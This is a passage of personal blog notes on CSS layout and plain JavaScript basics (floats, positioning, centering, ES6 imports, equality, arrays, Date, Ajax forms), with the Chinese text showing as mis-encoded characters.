leftçš„æ„æ€æ˜¯è®©è¿™ä¸ªå›¾ç‰‡å±…å·¦æ˜¾ç¤ºï¼ŒåŒæ—¶ï¼Œæ—è¾¹çš„textä¼šè‡ªåŠ¨è°ƒæ•´ï¼Œä¸è‡³äºè¢«å›¾ç‰‡æŒ¡ä½ã€‚å°±èƒ½å®ç°å›¾æ–‡æ··æ’çš„æ•ˆæœ*/ /*æ›´å…·ä½“ä¸€ç‚¹çš„æ„æ€å°±æ˜¯ï¼Œfloatå±æ€§çš„æ ‡ç­¾ï¼Œåœ¨htmlè®¡ç®—æ˜¯å¦éœ€è¦æ¢è¡Œçš„æ—¶å€™æ˜¯ä¸ä¼šè€ƒè™‘è¿™ä¸ªæ ‡ç­¾çš„ï¼ŒåŒæ—¶ï¼Œå°†æ ¹æ®float:leftæˆ–è€…rightæ‘†åœ¨çˆ¶å®¹å™¨çš„å·¦è¾¹æˆ–è€…å³è¾¹ã€‚æ„Ÿè§‰å°±åƒæ˜¯åœ¨zè½´æ–¹å‘æå‡äº†ä¸€ä¸ªå±‚çº§ã€‚*/ /*ä½†å¦‚æœæ¯ä¸€ä¸ªæ ‡ç­¾éƒ½è¢«æå‡åˆ°ä¸€ä¸ªzå±‚çº§,æ¯”å¦‚ä¸¤ä¸ªdivéƒ½æœ‰float:leftå±æ€§ï¼Œåé¢ä¸€ä¸ªä¼šæ’åœ¨å‰é¢ä¸€ä¸ªçš„å³è¾¹*/ &lt;div id=&#39;container&#39;&gt; &lt;div class=&quot;left_float&quot;&gt; &lt;p&gt;First Tag&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;left_float&quot;&gt; &lt;p&gt;Second&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; .left_float{ float: left; margin: 10px } /*floatæœ‰ä¸€ç‚¹å¥½å¤„å°±æ˜¯æµè§ˆå™¨ä¸ä¼šè®©æ–‡å­—è¢«floatçš„å…ƒç´ é®æŒ¡ä½ï¼Œæ‰€ä»¥ä¼šæŒªåˆ°ä¸‹é¢å»ï¼Œä½†æ–‡å­—æ ‡ç­¾çš„èƒŒæ™¯ä¼šå»¶ä¼¸åˆ°floatå…ƒç´ çš„ä¸‹é¢*/ .clear_float_for_text{ padding: 10px; background: #ddd; clear: both; } /*clear bothçš„æ„æ€æ˜¯è®©æ–‡å­—çš„å·¦å³å’Œä¸Šä¸‹èƒŒæ™¯éƒ½ä¸ä¼šå»¶ä¼¸åˆ°floatå…ƒç´ çš„ä¸‹é¢*/ floatçš„å…ƒç´ å’Œä¸‹é¢çš„æ–‡å­—ä¹‹é—´ä½¿ç”¨marginæ— æ•ˆï¼Œä¸€èˆ¬åœ¨textå‰é¢åŠ ä¸€ä¸ªç©ºçš„æˆ–è€…åœ¨floatçš„çˆ¶å…ƒç´ åŠ ä¸Š .folat_wrapper:after{ content: &#39;&#39;; display: block; clear: both; } è¿™ç§æ–¹å¼æ›´å¥½ï¼Œafterè¢«ç§°ä¸ºä¼ªå…ƒç´ ï¼Œå°±æ˜¯åœ¨çˆ¶å®¹å™¨åé¢æ’å…¥ä¸€ä¸ªç©ºçš„å…ƒç´  css3æœ‰ä¸€ä¸ªtransitionæ•ˆæœï¼Œå°±æ˜¯æ“ä½œä»»ä½•å±æ€§å˜æ¢éƒ½è®¾å®šä¸€ä¸ªäº‹ä»¶ï¼Œè¾¾åˆ°ä¸€ç§ç±»ä¼¼äºåŠ¨ç”»æ¼”è¿›çš„æ•ˆæœ list-style-type : noneä¼šæŠŠliæ ‡ç­¾å‰é¢çš„æ–¹å—å¹²æ‰ text-align: center;ä¸ä»…ä¼šæŠŠæ–‡å­—å±…ä¸­ï¼Œè¿˜ä¼šæŠŠè¿™ä¸ªå®¹å™¨ä¸­çš„imgä¹Ÿå±…ä¸­ CSS Positioningposition : absoluteæ„å‘³ç€remove it from normal document flow;position:relativeæ„å‘³ç€ç›¸å¯¹åŸæœ¬åº”è¯¥çš„ä½ç½®ç§»åŠ¨ï¼Œä½†ä¾ç„¶å æ®document flow;position:fixedæ„å‘³ç€ absolute æ˜¯æœ€æ£˜æ‰‹çš„positionå€¼ã€‚ absolute ä¸ fixed çš„è¡¨ç°ç±»ä¼¼ï¼Œä½†æ˜¯å®ƒä¸æ˜¯ç›¸å¯¹äºè§†çª—è€Œæ˜¯ç›¸å¯¹äºæœ€è¿‘çš„â€œpositionedâ€ç¥–å…ˆå…ƒç´ ã€‚å¦‚æœç»å¯¹å®šä½ï¼ˆpositionå±æ€§çš„å€¼ä¸ºabsoluteï¼‰çš„å…ƒç´ æ²¡æœ‰â€œpositionedâ€ç¥–å…ˆå…ƒç´ ï¼Œé‚£ä¹ˆå®ƒæ˜¯ç›¸å¯¹äºæ–‡æ¡£çš„ body å…ƒç´ ï¼Œå¹¶ä¸”å®ƒä¼šéšç€é¡µé¢æ»šåŠ¨è€Œç§»åŠ¨ã€‚è®°ä½ä¸€ä¸ªâ€œpositionedâ€å…ƒç´ æ˜¯æŒ‡ position å€¼ä¸æ˜¯ static çš„å…ƒç´ ã€‚ å…¶å®å°±æ˜¯å…ƒç´ çš„postion:absoluteä¹‹åï¼Œå°±å¯ä»¥æ·»åŠ top,right,bottom,leftè¿™äº›å±æ€§äº†ã€‚ä½†æ˜¯ è¿™äº›å±æ€§ä¸æ˜¯ç®€å•çš„è¯´å°±ç›´æ¥ç›¸å¯¹äºå…¶parentå…ƒç´ çš„ã€‚è€Œæ˜¯ç›¸å¯¹äºæœ€è¿‘ä¸€ä¸ªpositionä¸æ˜¯staticçš„çˆ¶å…ƒç´ ï¼ˆstaticæ˜¯defaultï¼Œæ‰€ä»¥å¦‚æœç›´ç³»çˆ¶å…ƒç´ ä¸å†™çš„è¯ï¼Œå­å…ƒç´ ä¼šå¿½ç•¥ top, bottom, left, right æˆ–è€… z-index å£°æ˜ï¼‰ã€‚å¦‚æœçœŸçš„ä¸€ä¸ªä¸ªå¾€ä¸Šæ‰¾éƒ½æ²¡æœ‰çš„è¯ï¼Œç›´æ¥ç›¸å¯¹äºbodyèµ·æ•ˆã€‚ Definitely will center a text in div , both horizontally and verticallyCSS center text (horizontally and vertically) inside a div block &lt;div id=&quot;container&quot;&gt; &lt;div id=&quot;content&quot;&gt; Line 1 &lt;/div&gt; &lt;/div&gt; (function() { var toggle = true; setInterval(function() { if (toggle) { $(&quot;#content&quot;).html(&quot;Line 1&quot;); } else { $(&quot;#content&quot;).html(&quot;&lt;div&gt;Line 1&lt;/div&gt;&lt;div&gt;Line 2&lt;/div&gt;&quot;); } toggle = !toggle; }, 1300); }()); body { font: 36px Arial, sans-serif; } #container { color: white; background: #ffbd17; width: 400px; height: 260px; } #content { background: #06c; width: 120px; margin-left: auto; margin-right: auto; position: relative; top: 50%; transform: translateY(-50%); } css position z index and stack orderinghtmlæ–‡ä»¶ä»ä¸Šåˆ°ä¸‹ï¼Œè¶Šæ˜¯åœ¨ä¸‹é¢çš„æ–‡ä»¶ï¼Œåœ¨zè½´æ–¹å‘ä¸Šçš„é«˜åº¦å°±è¶Šé«˜ã€‚æ‰€ä»¥é¡¶éƒ¨navè¦å†™åœ¨æœ€åº•ä¸‹ã€‚è¿™æ˜¯é»˜è®¤æƒ…å†µå¦‚æœè¦æ”¾åœ¨é¡¶éƒ¨çš„è¯ï¼Œéœ€è¦æ·»åŠ z-indexï¼š1;é»˜è®¤æ‰€æœ‰çš„z-index=0ã€‚ä½¿z-indexç”Ÿæ•ˆçš„å‰ææ˜¯ç»™äº†ä¸€ä¸ªpositionå±æ€§ Clipping Contentå…ˆåŠ ä¸Šä¸€ä¸ªmax-heightï¼Œç„¶åä½¿ç”¨over-flow : hidden; è¿™ä¸ªå±æ€§é»˜è®¤å€¼æ˜¯visibleã€‚ä½¿ç”¨autoä¼šåœ¨å†…å®¹é«˜åº¦è¶…è¿‡å®¹å™¨é«˜åº¦çš„æ—¶å€™å¸¦ä¸Šä¸€ä¸ªscrollbarï¼Œå†…å®¹å¯ä»¥æ»šåŠ¨ã€‚ä½¿ç”¨scrollçš„æ—¶å€™ä¼šåœ¨å³ä¾§å’Œåº•éƒ¨åŠ ä¸Šscrollbarï¼Œæ— è®ºæ˜¯å¦è¶…å‡ºäº†max-height @Media(max-width=768){ body{ display: none; } } è¿™é‡Œé¢çš„cssåªä¼šåœ¨å¹³æ¿åŠæ‰‹æœºä¸Šç”Ÿæ•ˆï¼Œå…¶å®768pxä¹Ÿå°±æ˜¯å¹³æ¿å’Œä¸€èˆ¬ç”µè„‘å®½åº¦åƒç´ çš„ç•Œé™äº† å­å…ƒç´ çš„marginä¼šç§»åŠ¨çˆ¶å…ƒç´  ç»™parentåŠ ä¸Šoverflow :autoå°±å¥½äº† æœ‰æ—¶å€™é‡åˆ°é‡å¤§ç¾éš¾ï¼Œä¸€äº›é—¨æˆ·ç½‘ç«™ä¼šæŠŠè‡ªå®¶é¦–é¡µå˜æˆé»‘ç™½è‰²çš„ï¼Œè¿™ç§æƒ…å†µå…¶å®ä¸å¤šè§ã€‚2018å¹´3æœˆ14æ—¥ï¼Œéœé‡‘é€ä¸–ï¼Œé˜¿é‡Œäº‘å˜æˆé»‘çš„äº†ã€‚F12äº†ä¸€ä¸‹ï¼Œç›´æ¥æ”¹åœ¨bodyçš„styleä¸Šäº†åŸè·¯ç²˜è´´è‡³æ­¤ body{ -webkit-filter: grayscale(100%); -moz-filter: grayscale(100%); -ms-filter: grayscale(100%); -o-filter: grayscale(100%); filter: grayscale(100%); filter: gray; } font awesomeæ€ä¹ˆç”¨ç›´æ¥ä¸‹è½½ä¸‹æ¥ä¸€ä¸ªzipæ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ°font-awesomeæ–‡ä»¶å¤¹ï¼Œæ•´ä¸ªä¸¢åˆ°é¡¹ç›®ä¸­ï¼Œhtmlä¸­å¼•ç”¨â€™./font-awesome/css/font-awesome.css.minâ€™å³å¯ã€‚ä¸€èˆ¬æ˜¯ç²˜è´´åˆ°ä¸€ä¸ªaæ ‡ç­¾é‡Œé¢ã€‚ æ›´æ–° cssmaticå¾ˆå¤šæ—¶å€™ï¼Œæ‰‹å†™cssæ˜¯ä¸€ç§å¥¢ä¾ˆï¼Œcssè¿™ç§ä¸œè¥¿æœ¬æ¥å°±å±äºæ ·å¼ä¸€ç±»ï¼Œå°½é‡å»å¤åˆ¶ç²˜è´´ï¼Œä¸è¦è‡ªå·±å†™ æœ‰äº›æµè§ˆå™¨ä¸æ”¯æŒç‰¹å®šæ ·å¼çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨Modernizrzè¿™ä¸ªjavaScriptåº“ ä½œä¸ºæ–°æ‰‹ï¼Œå¤šæ•°æ—¶å€™cssä¸èµ·æ•ˆæ˜¯å› ä¸ºclasså’Œidåœ¨htmlä¸­å’Œcssä¸­æ‹¼å†™é”™äº† æ¯”è¾ƒåˆé€‚çš„csså¸ƒå±€æ•™ç¨‹ å‚è€ƒcsså±‚å ä¼˜å…ˆçº§Material CSScssé€‰æ‹©å™¨æ±‡æ€»è°·æ­Œçš„å­—ä½“åº“ è‡ªå·±å»ä¸‹ï¼Œå¾ˆå¤š æ–‡å­—å±…ä¸­çš„ä¸€ç§ç®€å•çš„æ–¹å¼ body { height: 100vh; display: flex; justify-content: center; align-items: center; font-size: 5rem; } Pseudo Elemnetæ˜¯åœ¨ä¸€ä¸ªelementçš„contentå‰é¢æˆ–è€…åé¢æ·»åŠ å†…å®¹ï¼Œè€Œä¸æ˜¯æ·»åŠ äº†ä¸€ä¸ªæ ‡ç­¾ã€‚æ³¨æ„ï¼Œå¯¹imgæ ‡ç­¾æ— æ•ˆã€‚Pseudo Elemnet p::before { content: &quot;&quot;; background: red; font-size: 20px; color: white; font-weight: 900; vertical-align: middle; line-height: normal; } /*è¿™ç§åœ¨å·¦ä¾§æ·»åŠ ä¸€ä¸ªå°å›¾æ ‡çš„æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥çš„*/ p::before { content: &quot;https://www.baidu.com/img/bd_logo1.png&quot;; width: 20px; height: 20px; }","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"},{"name":"css","slug":"css","permalink":"https://haldir65.github.io/tags/css/"}]},{"title":"Vanilla JS Tips","date":"2017-10-29T22:10:27.000Z","path":"2017/10/29/2017-10-29-pure-javaScript/","text":"Vanilla JSå…¶å®å°±æ˜¯åŸç”Ÿjavascriptäº†ã€‚è®ºè¿è¡Œé€Ÿåº¦ï¼Œåœ¨Vanilla JSé¢å‰ï¼Œæ‰€æœ‰çš„js libraryéƒ½è¦æ…¢å¾ˆå¤šã€‚ å…³äºjsçš„å†å²ï¼Œæ ¹æ®Patrick Dubroyåœ¨2014å¹´çš„ä¸€æ¬¡æ¼”è®²ï¼ŒES3æ˜¯1999å¹´å‡ºæ¥çš„ï¼ŒES3ä¹‹å‰çš„ç‰ˆæœ¬ç®€ç›´æ˜¯ç¿”ã€‚ES4è®¾è®¡çš„å®åœ¨å¤ªç‰›é€¼ï¼Œä¸€ç›´æ‹–åˆ°2008å¹´ä¹Ÿæ²¡æå®šï¼Œæ‰€ä»¥å¤§å®¶å†³å®šç›´æ¥è·³è¿‡ES4(å†å²ä¸Šä¹Ÿä»æœªæœ‰è¿‡ES4)ï¼Œæ¨å‡ºäº†ES5ï¼ˆåªæŠŠES4ä¸­çš„ä¸€éƒ¨åˆ†å®ç°äº†ï¼‰ï¼Œå®é™…ä¸Š2015å¹´6æœˆES6(ä¹Ÿå°±æ˜¯2008å¹´é‚£å¸®äººæ‰€ç§°å‘¼çš„harmony)æ‰å‘å¸ƒã€‚å…³äºPatrick Dubroyï¼Œè¿™äººåœ¨2011å¹´çš„Google IOä¸Šåšè¿‡å…³äºç”¨matæ£€æµ‹Android Memory Leakçš„æ¼”è®²ï¼Œè€å¤–çœŸæ˜¯å…¨æ‰ã€‚ TakeAways åŸºæœ¬è¯­æ³• æ“ä½œhtmlçš„ä¸€äº›ç‚¹ äº¤äº’äº‹ä»¶çš„æ³¨å†Œï¼Œæ•è·ï¼Œæ‹¦æˆª å¼‚æ­¥ ES6æ–°å¢çš„ä¸œè¥¿ æˆ‘ä¹Ÿä¸çŸ¥é“å½’åˆ°å“ªä¸€ç±»çš„é—®é¢˜ ä¸€äº›tricks 1. ä¸€äº›ä½œä¸ºä¸€é—¨è¯­è¨€åŸºæœ¬çš„æ“ä½œéƒ½æœ‰ 1.1 æ¯”å¦‚è¯´moduleï¼ˆå°±æ˜¯importï¼Œexportè¿™ç§ï¼Œè™½ç„¶æ˜¯ES6æ‰è¡¥ä¸Šçš„ï¼‰ jsä¸­å¥½åƒæ²¡æœ‰åƒjavaä¸­é‚£ç§javaBeançš„ç‰¹æ®Šçš„æ•°æ®ç±»å‹çš„å­˜åœ¨ã€‚å…¶å®ä¹Ÿä¸éœ€è¦ï¼Œjså¹¶ä¸æ˜¯ä¸€ç§ç”¨classæ¥model real world objectçš„è¯­è¨€ã€‚ES6å¼€å§‹å¯ä»¥ä½¿ç”¨importå’Œexportè¯­æ³•ï¼Œæœ‰ç±»ä¼¼çš„æ•ˆæœï¼Œå‚è€ƒä½†node jsç›®å‰(version 8.x)è¿˜ä¸æ”¯æŒes 2015çš„import exportè¯­æ³•ï¼Œåånodeå¯¹äºå…¶ä»–es2015çš„ç‰¹æ€§éƒ½æ”¯æŒåˆ°ä½äº†ã€‚ // states.js export default { STATES: { &#39;AU&#39; : {...}, &#39;US&#39; : {...} } }; // accept.js import { STATES } from &#39;./states&#39;; //undefined import STATES from &#39;./states&#39;; // concrete object ,this works import whatever from &#39;states&#39;; // concrete object, this works // å¦ä¸€ç§æƒ…å†µ var STATES = {}; STATES.AU = {...}; STATES.US = {...}; export STATES; import { STATES } from &#39;states&#39;;//å¦‚æœè¾“å‡ºæ–¹ä½¿ç”¨export defaultï¼Œæ¥æ”¶æ–¹ä¸åº”åŠ ä¸Šå¤§æ‹¬å·ã€‚æ­¤æ—¶è¾“å‡ºæ–¹è¾“å‡ºçš„æ˜¯åŒ¿åObjectï¼Œæ¥æ”¶æ–¹éšä¾¿èµ·ä»€ä¹ˆåå­—éƒ½è¡Œã€‚ // å¦‚æœè¾“å‡ºæ–¹è¾“å‡ºæœ‰æ˜ç¡®å®šä¹‰çš„function, objectï¼Œæ¥æ”¶æ–¹éœ€è¦æ·»åŠ å¤§æ‹¬å·ã€‚ es6çš„importå’Œexportéœ€è¦æ³¨æ„ // A.js export default function greet(params) { console.log(&#39;hello&#39;); } // B.js import firstGreet from &#39;.A.js&#39;; //this works import { firstGreet } from &#39;.A.js&#39;; // undefined ! // A.js const sayHi = function hi() { console.log(&quot;hi&quot;); } export { sayHi } // B.js import { firstGreet } from &#39;.A.js&#39;; // this works åŸå› å°±åœ¨äºç¬¬ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨åŒ¿åexportçš„ã€‚ 1.2 åŸºæœ¬çš„æ“ä½œç¬¦ï¼Œdynanic type,å‡½æ•°ï¼Œå˜é‡ï¼Œoop,classï¼ˆES6ï¼‰,forå¾ªç¯,whileè¿™äº›éƒ½æœ‰ jsé‡Œé¢åˆ¤æ–­ä¸¤ä¸ªå˜é‡ç›¸ç­‰çš„æ–¹å¼ï¼Œå»ºè®®ä¸€å¾‹ä½¿ç”¨ä¸‰ä¸ªç­‰å·ï¼ˆä¸¥æ ¼ç›¸ç­‰ï¼‰===è¿˜æ˜¯==ç®€è¨€ä¹‹å°±æ˜¯==ä¼šå…ˆåšä¸€æ¬¡ç±»å‹è½¬æ¢ï¼Œ===åˆ™ä¸ä¼š var a = 3; var b = &quot;3&quot;; a==b è¿”å› true a===b è¿”å› false // å› ä¸ºa,bçš„ç±»å‹ä¸ä¸€æ · // ==åªæ¯”è¾ƒäº†å€¼ // ===åªæœ‰åœ¨å€¼å’Œç±»å‹å®Œå…¨ç›¸åŒçš„æ—¶å€™æ‰ä¸ºtrueï¼Œç”¨æ¥è¿›è¡Œä¸¥æ ¼çš„æ¯”è¾ƒåˆ¤æ–­ // !=ï¼ˆåªæ£€æŸ¥å€¼ï¼‰å’Œ!==ï¼ˆæ£€æŸ¥å€¼å’Œç±»å‹ï¼‰ä¹Ÿå·®ä¸å¤šçš„æ„æ€ã€‚ = èµ‹å€¼è¿ç®—ç¬¦ == ç­‰äº === ä¸¥æ ¼ç­‰äº &amp;&amp;å’Œ||ä¹Ÿæœ‰ï¼Œ!=ä¹Ÿæœ‰ - trueå’Œfalseä¹Ÿæœ‰ // truthyçš„æ¦‚å¿µæ˜¯jsé‡Œé¢ç‰¹æœ‰çš„ // åœ¨consoleé‡Œé¢è¾“å…¥ï¼š Boolan(5) &gt; è¾“å‡ºtrue Boolean(-5) &gt;è¾“å‡ºfalse Boolean(7&gt;5) &gt; è¾“å‡ºtrue Boolean(&#39;someword&#39;) &gt; true Boolean(&#39;&#39;) &gt; false // åªæœ‰Boolan(0)æ‰æ˜¯false stringï¼Œnumber,arrayä¹Ÿæœ‰ // var myString = &#39;i &#39;m a &quot;funny&quot; string&#39; #è¿™æ ·æ˜¯ä¸è¡Œçš„ var myString = &#39;i \\&#39;m a &quot;funny&quot; string&#39;;//åŠ ä¸€ä¸ªè½¬ä¹‰å°±å¥½äº† var a = &#39;abc&#39; var b = &#39;bcd&#39; a&lt;b // true,å› ä¸ºASCIIè¡¨é‡Œé¢ï¼Œaåœ¨bå‰é¢ var str = &#39;hello world&#39; var str2 = str.slice(2,9); str2 // &#39;llo,wo&#39; var tags = &#39;meat,ham ,salami,prok,beef,chicken&#39; var tagsArray = tags.split(&quot;,&quot;) //ç”Ÿæˆ [&quot;meat&quot;,&quot;ham&quot;,&quot;salami&quot;,&quot;prok&quot;,&quot;beef&quot;,&quot;chicken&quot;] jsçš„Arrayé‡Œé¢èƒ½å¤Ÿè£…ä¸åŒç±»å‹çš„æ•°æ®ï¼Œè·ŸPythonå¾ˆåƒ //åˆ›å»ºArrayçš„æ–¹å¼å¾ˆå¤š var array = [] var array1 = [&#39;stuff&#39;,&#39;jeff&#39;,20] var array2 = new Array() var myArray = []// åˆå§‹åŒ–å°±å¥½äº†ï¼Œæ— éœ€æŒ‡å®šå®¹é‡ myArray[0] =&#39;stuff&#39; myArray[1] = 70 myArray &gt; [&#39;stuff&#39;,70] myArray[30] = true // ä»¥ä¸‹ä¸ºäº²æµ‹consoleä¸­çš„è¾“å‡ºå°±è¿™æ · myArray &gt; (31) [&quot;stuff&quot;, 70, empty Ã— 28, true] myArray[12] &gt; &#39;undefined&#39; myArray.length &gt; 31 myArray.sort() &gt; (31) [70, &quot;stuff&quot;, true, empty Ã— 28] Objectï¼Œclassè¿™ç§oopçš„ç‰¹æ€§ä¹Ÿæœ‰ var myCaR = new Car() VM315:1 Uncaught ReferenceError: Car is not defined at &lt;anonymous&gt;:1:13 var myString = new String() myString = &#39;hello&#39; myString.length &gt; 5 var mystring23 = new String(&#39;stuff&#39;)//è¿™ä¹Ÿæ˜¯è¡Œçš„ // ç›´æ¥åœ¨consoleé‡Œå†™ var myCar = new Object() undefined myCar.speed = 20 20 myCar.speed 20 myCar.name = &#39;benz&#39; &quot;benz&quot; myCar.name &quot;benz&quot; myCar {speed: 20, name: &quot;benz&quot;} //jsonå³object var car2 = {speed: 30, name: &quot;tesla&quot;} car2 {speed: 30, name: &quot;tesla&quot;} ä¸Šä¸‹æ–‡çš„æ¦‚å¿µä¹Ÿæœ‰ï¼Œthiså…³é”®å­—ï¼Œä½†è¦æ³¨æ„é—­åŒ… // consoleç›´æ¥è¾“å…¥ this Window {frames: Window, postMessage: Æ’, blur: Æ’, focus: Æ’, close: Æ’, â€¦}//windowæ˜¯ä¸€ä¸ªæœ‰å¾ˆå¤šå˜é‡(functionä¹Ÿæ˜¯å˜é‡)çš„å¯¹è±¡ï¼Œåœ¨å½“å‰è¯­ä¹‰ä¸‹ï¼Œå°±æ˜¯window car2.test = function(){console.log(this)} car2 {speed: 30, name: &quot;tesla&quot;, test: Æ’} car2.test Æ’ (){console.log(this)} car2.test()//è¿™æ—¶å€™thiså°±æ˜¯car2è¿™ä¸ªObjectäº† VM592:1 {speed: 30, name: &quot;tesla&quot;, test: Æ’} thisåº”è¯¥æ˜¯å½“å‰ä¸Šä¸‹æ–‡ Construction functionï¼Œå‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªobjectçš„æˆå‘˜ var Car = function (name,speed) { this.name = name this.speed = speed this.test = function () { console.log(&#39;speed is &#39;+speed) } } var car24 = new Car(&#39;jim&#39;,40) car24 Car {name: &quot;jim&quot;, speed: 40, test: Æ’} car24.test() VM621:5 speed is 40 Object definition(construcor)ï¼Œclassä¹Ÿæœ‰ è¿˜æœ‰éšä¾¿ç”¨çš„log 1.3 ä¸€äº›å·¥å…·ï¼Œæ—¶é—´,Mathï¼Œioæ“ä½œï¼ˆæ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œï¼‰ä¹Ÿæœ‰Date çš„ä½¿ç”¨ Date.now() //æ—¶é—´æˆ³ï¼Œæ¯«ç§’ 1580281147599 Date.parse(&#39;2020-02-31&#39;) // è¿”å›æ—¶é—´æˆ³ 1583107200000 Date.parse(&#39;2020-02-31&#39;) // æ³¨æ„åˆ°2æœˆ31å·æ˜¯ä¸å­˜åœ¨çš„ï¼Œå› æ­¤å®é™…ä¸Šæ˜¯3æœˆ1å· Sun Mar 01 2020 08:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) {} //åˆ›å»ºDate object let past = new Date(2007,11,9) let future = new Date(2020, 11, 17, 3, 24, 0) undefined past // Sun Dec 09 2007 00:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´) past.getDay Æ’ getDay() { [native code] } past.getDay() 0 past.getFullYear() 2007 past.getDate Æ’ getDate() { [native code] } past.getDate() 9 ç½‘ç»œè¯·æ±‚ï¼ŒAjax(Asynchronous javaScript &amp; xml)è¯·æ±‚çš„å¥—è·¯ä¹Ÿæœ‰(AJAXå‘½åä¸Šå°±æ˜¯å¼‚æ­¥çš„)XMLHttpRequestç¼©å†™æ˜¯(XHR)å…³äºXHR Objectçš„ä¸€äº›ç‰¹ç‚¹ API In the form of an object Provided by the browserâ€™s js environment can be used with other protocols than http Can work with data other than XML(Json ,plain text) æœ‰å¾ˆå¤šçš„Libraryèƒ½å¹²ajaxä¸€æ ·çš„äº‹æƒ…:jQuery,Axios,Superagent,Fetch API,Prototype,Node HTTP ajaxçš„onloadåªä¼šåœ¨onreadystatechange==4çš„æ—¶å€™æ‰ä¼šè§¦å‘MDNæ–‡æ¡£ä¸Šè¯´ajaxçš„readyStateæœ‰äº”ç§ï¼š0 UNSENT ä»£ç†è¢«åˆ›å»ºï¼Œä½†å°šæœªè°ƒç”¨ open() æ–¹æ³•ã€‚1 OPENED open() æ–¹æ³•å·²ç»è¢«è°ƒç”¨ã€‚2 HEADERS_RECEIVED send() æ–¹æ³•å·²ç»è¢«è°ƒç”¨ï¼Œå¹¶ä¸”å¤´éƒ¨å’ŒçŠ¶æ€å·²ç»å¯è·å¾—ã€‚3 LOADING ä¸‹è½½ä¸­ï¼› responseText å±æ€§å·²ç»åŒ…å«éƒ¨åˆ†æ•°æ®ã€‚4 DONE ä¸‹è½½æ“ä½œå·²å®Œæˆã€‚ xhr.onProgressçš„readyStateæ˜¯3ï¼Œè¿™ä¸ªæ—¶å€™æ˜¾ç¤ºåŠ è½½è¿›å…¥æ¡å°±å¯ä»¥äº†ã€‚ è¡¨å•çš„æ“ä½œ &lt;h1&gt;Normal get form&lt;/h1&gt; &lt;form method=&quot;GET&quot; action=&quot;process.php&quot;&gt; &lt;input type=&quot;text&quot; name=&#39;name&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;h1&gt;Ajax get form&lt;/h1&gt; &lt;form id=&#39;getForm&#39; &gt; &lt;input type=&quot;text&quot; name=&#39;name&#39; id=&#39;name1&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;h1&gt;Normal post form&lt;/h1&gt; &lt;form method=&quot;POST&quot; action=&quot;process.php&quot;&gt; &lt;input type=&quot;text&quot; name=&#39;name&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;h1&gt;Ajax post form&lt;/h1&gt; &lt;form id=&#39;postForm&#39; name=&#39;name&#39; id=&#39;name2&#39;&gt; &lt;input type=&quot;text&quot; name=&#39;name&#39;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; document.getElementById(&#39;getForm&#39;).addEventListener(&#39;submit&#39;, getName); function getName(e){ e.preventDefault(); var name = document.getElementById(&#39;name1&#39;).value;//ç”¨æˆ·è¾“å…¥çš„å†…å®¹ var xhr = new XMLHttpRequest(); xhr.open(&#39;GET&#39;,&#39;process.php?name=&#39;+name,true); xhr.onload = function(){ console.log(this.responseText); } xhr.send(); } document.getElementById(&#39;postForm&#39;).addEventListener(&#39;submit&#39;, postName); function postName(e){ e.preventDefault(); var name = document.getElementById(&#39;name2&#39;).value;//ç”¨æˆ·è¾“å…¥çš„å†…å®¹ var params =&quot;name=&quot;+name; var xhr = new XMLHttpRequest(); xhr.open(&#39;POST&#39;,&#39;process.php&#39;,true); xhr.setRequestHeader(&#39;Content-type&#39;,&#39;application/x-www-form-urlencoded&#39;) xhr.onload = function(){ console.log(this.responseText); } xhr.send(); } JavaScript randomæ–¹æ³•å¾—åˆ°éšæœºæ•´æ•° document.write(Math.ceil(Math.random()*3)) //å¾—åˆ°1-3çš„æ•´æ•° document.write(Math.floor(Math.random()*4)); //å¾—åˆ°0-3çš„æ•´æ•° Math.round() //å½“å°æ•°æ˜¯0.5æˆ–è€…å¤§äº0.5çš„æ—¶å€™å‘ä¸Šä¸€ä½ Math.ceil() //å§‹ç»ˆå‘ä¸Šä¸€ä½ Math.floor() // å§‹ç»ˆå‘ä¸‹èˆå…¥ 2. æ“ä½œHTML-DOMçš„ä¸€äº›æ–¹æ³•é€šè¿‡ id æ‰¾åˆ° HTML å…ƒç´  window.document.getElementById()é€šè¿‡æ ‡ç­¾åæ‰¾åˆ° HTML å…ƒç´  window.document.getElementsByTagName()//æ¯”å¦‚è¯´â€™h2â€™è¿™ç§é€šè¿‡ç±»åæ‰¾åˆ° HTML å…ƒç´  window.document.getElementsByClassName()æ³¨æ„æ–¹æ³•åç§°ï¼Œå¸¦sçš„è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸å¸¦sè¿”å›ä¸€ä¸ªobjectæ‰¾form æ ‡ç­¾çš„è¯ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•:å…ˆæ‰‹å†™ä¸€æ®µhtml &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;title&gt;æœ‰æ—¶å€™æ‰‹å†™htmlä¸æ˜¯åäº‹&lt;/title&gt; &lt;link href=&quot;style.css&quot; type=&quot;text/css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/link&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;form id=&#39;my-form&#39; name=&#39;myForm&#39; action=&quot;#&quot;&gt; &lt;label for=&quot;name&quot;&gt;Name: &lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br/&gt; &lt;label&gt;Hobbies: &lt;/label&lt;br/&gt; &lt;input type=&quot;checkbox&quot; name=&quot;biking&quot; value=&quot;biking&quot;&gt;Biking&lt;/br&gt; &lt;input type=&quot;checkbox&quot; name=&quot;sking&quot; 